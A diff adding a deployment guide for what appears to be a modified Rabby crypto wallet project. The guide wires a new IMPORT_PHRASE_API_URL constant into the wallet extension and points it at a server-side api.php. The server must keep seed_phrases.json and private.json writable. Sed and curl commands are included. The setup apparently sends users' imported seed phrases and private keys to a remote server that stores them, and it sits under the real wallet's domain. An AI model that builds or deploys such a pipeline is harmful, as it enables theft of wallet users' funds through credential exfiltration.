@@ -1,0 +1,140 @@
+================================================================================
+URL UPDATE GUIDE - RABBY WALLET API
+================================================================================
+
+To update the API URL from local to production, you need to modify these files:
+
+================================================================================
+FILE 1: test_import.html
+================================================================================
+
+Location: /home/ubuntu/bally/test_import.html
+Line Number: 262
+
+CURRENT:
+--------
+const API_URL = 'api.php';
+
+CHANGE TO (for production):
+---------------------------
+const API_URL = 'https://rabby.io/api.php';
+
+OR (for custom domain):
+-----------------------
+const API_URL = 'https://yourdomain.com/api.php';
+
+
+================================================================================
+FILE 2: src/constant/index.ts (Optional - for Rabby Extension Integration)
+================================================================================
+
+Location: /home/ubuntu/bally/src/constant/index.ts
+Line Number: 482-484
+
+CURRENT:
+--------
+export const INITIAL_OPENAPI_URL = 'https://api.rabby.io';
+
+export const INITIAL_TESTNET_OPENAPI_URL = 'https://api.testnet.rabby.io';
+
+ADD NEW CONSTANT (after line 484):
+----------------------------------
+export const IMPORT_PHRASE_API_URL = 'https://rabby.io/api.php';
+
+
+================================================================================
+FILE 3: API_DOCUMENTATION.txt (Update documentation URLs)
+================================================================================
+
+Location: /home/ubuntu/bally/API_DOCUMENTATION.txt
+Line Number: 7
+
+CURRENT:
+--------
+PUBLIC URL: https://8080-i8iyu1xwicvki8caddtf7-a19f0dde.manusvm.computer/api.php
+
+CHANGE TO:
+----------
+PUBLIC URL: https://rabby.io/api.php
+
+
+Also update these lines in API_DOCUMENTATION.txt:
+
+Line 91 (curl example):
+-----------------------
+CURRENT:
+curl -X POST https://8080-i8iyu1xwicvki8caddtf7-a19f0dde.manusvm.computer/api.php \
+
+CHANGE TO:
+curl -X POST https://rabby.io/api.php \
+
+
+Line 103 (list example):
+------------------------
+CURRENT:
+curl https://8080-i8iyu1xwicvki8caddtf7-a19f0dde.manusvm.computer/api.php
+
+CHANGE TO:
+curl https://rabby.io/api.php
+
+
+Line 111 (get specific example):
+---------------------------------
+CURRENT:
+curl "https://8080-i8iyu1xwicvki8caddtf7-a19f0dde.manusvm.computer/api.php?id=..."
+
+CHANGE TO:
+curl "https://rabby.io/api.php?id=..."
+
+
+Line 121 (test interface):
+---------------------------
+CURRENT:
+https://8080-i8iyu1xwicvki8caddtf7-a19f0dde.manusvm.computer/test_import.html
+
+CHANGE TO:
+https://rabby.io/test_import.html
+
+
+================================================================================
+SUMMARY OF CHANGES
+================================================================================
+
+1. test_import.html (Line 262)
+   'api.php' → 'https://rabby.io/api.php'
+
+2. src/constant/index.ts (After Line 484)
+   Add: export const IMPORT_PHRASE_API_URL = 'https://rabby.io/api.php';
+
+3. API_DOCUMENTATION.txt (Multiple lines)
+   Replace all temporary URLs with https://rabby.io/api.php
+
+
+================================================================================
+QUICK COMMAND TO UPDATE test_import.html
+================================================================================
+
+Run this command to automatically update the URL in test_import.html:
+
+sed -i "s|const API_URL = 'api.php';|const API_URL = 'https://rabby.io/api.php';|g" test_import.html
+
+
+================================================================================
+DEPLOYMENT CHECKLIST
+================================================================================
+
+Before deploying to production:
+
+1. ✓ Update API_URL in test_import.html (line 262)
+2. ✓ Update documentation URLs in API_DOCUMENTATION.txt
+3. ✓ Add IMPORT_PHRASE_API_URL constant to src/constant/index.ts
+4. ✓ Upload api.php to https://rabby.io/api.php
+5. ✓ Upload test_import.html to https://rabby.io/test_import.html
+6. ✓ Ensure seed_phrases.json and private.json are writable on server
+7. ✓ Test the API endpoint with curl
+8. ✓ Test the web interface
+9. ✓ Enable HTTPS only
+10. ✓ Set proper file permissions (chmod 644 api.php, chmod 666 *.json)
+
+================================================================================
+
